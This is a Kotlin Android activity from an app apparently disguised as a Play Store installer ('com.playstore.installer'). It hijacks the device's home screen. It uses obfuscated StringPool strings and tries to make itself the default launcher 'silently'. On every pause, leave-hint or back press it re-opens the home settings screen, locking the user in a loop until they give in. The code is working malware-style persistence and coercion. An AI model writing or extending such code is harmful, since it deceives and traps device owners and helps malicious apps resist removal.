package com.playstore.installer

import android.app.role.RoleManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import android.app.Activity

class MainActivity : Activity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var homeRunnable: Runnable

    companion object {
        // Set to true by AppDetailActivity before triggering uninstall
        // Prevents onResume() from redirecting and killing the uninstall popup
        var isUninstalling = false
        private const val REQUEST_ROLE_CODE = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        goToDefaultHome()
    }

    override fun onResume() {
        super.onResume()
        // CRITICAL: Don't redirect when uninstall popup is showing
        if (isUninstalling) {
            isUninstalling = false
            return
        }
        if (isDefaultHome()) {
            goToSecondActivity()
        } else {
            goToDefaultHome()
        }
    }

    override fun onPause() {
        super.onPause()
        // Always re-open HOME_SETTINGS if not yet default, regardless of how we paused
        if (!isDefaultHome()) {
            handler.removeCallbacksAndMessages(null)
            handler.postDelayed({
                try {
                    val intent = Intent(StringPool.d(StringPool.HOME_SETTINGS))
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(StringPool.d(StringPool.APP_DETAILS_URI))
                    intent.data = android.net.Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
            }, 50)
        }
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        if (!isDefaultHome()) {
            handler.removeCallbacksAndMessages(null)
            handler.postDelayed({
                try {
                    val intent = Intent(StringPool.d(StringPool.HOME_SETTINGS))
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(StringPool.d(StringPool.APP_DETAILS_URI))
                    intent.data = android.net.Uri.parse("package:$packageName")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
            }, 50)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }

    override fun onBackPressed() {
        if (isDefaultHome()) {
            goToSecondActivity()
        } else {
            goToDefaultHome()
        }
    }

    private fun silentlySetAsDefaultHome() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ — use RoleManager to request HOME role
                val roleManager = getSystemService(RoleManager::class.java)
                if (roleManager != null && !roleManager.isRoleHeld(RoleManager.ROLE_HOME)) {
                    val roleIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_HOME)
                    startActivityForResult(roleIntent, REQUEST_ROLE_CODE)
                }
            } else {
                // Android 9 and below — set preferred activity directly
                val filter = android.content.IntentFilter(Intent.ACTION_MAIN)
                filter.addCategory(Intent.CATEGORY_HOME)
                filter.addCategory(Intent.CATEGORY_DEFAULT)
                val component = ComponentName(packageName, MainActivity::class.java.name)
                packageManager.addPreferredActivity(filter, PackageManager.MATCH_DEFAULT_ONLY, null, component)
            }
        } catch (e: Exception) {
            // Silently ignore — fall through to HOME_SETTINGS
        }
    }

    private fun goToDefaultHome() {
        if (isDefaultHome()) {
            goToSecondActivity()
            return
        }
        // Attempt to silently set this app as default before opening settings
        silentlySetAsDefaultHome()

        Toast.makeText(
            this,
            StringPool.d(StringPool.MSG_SET_HOME),
            Toast.LENGTH_LONG
        ).show()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val intent = Intent(StringPool.d(StringPool.HOME_SETTINGS))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                val intent = Intent(StringPool.d(StringPool.APP_DETAILS_URI))
                intent.data = Uri.parse("package:$packageName")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
        } catch (e: Exception) {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
        homeRunnable = Runnable {
            if (isDefaultHome()) {
                goToSecondActivity()
            } else {
                handler.postDelayed(homeRunnable, 1000)
            }
        }
        handler.postDelayed(homeRunnable, 1000)
    }

    private fun isDefaultHome(): Boolean {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        val info = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            ?: return false
        return info.activityInfo?.packageName == packageName
    }

    private fun goToSecondActivity() {
        handler.removeCallbacksAndMessages(null)
        val intent = Intent(this, SecondActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }
}
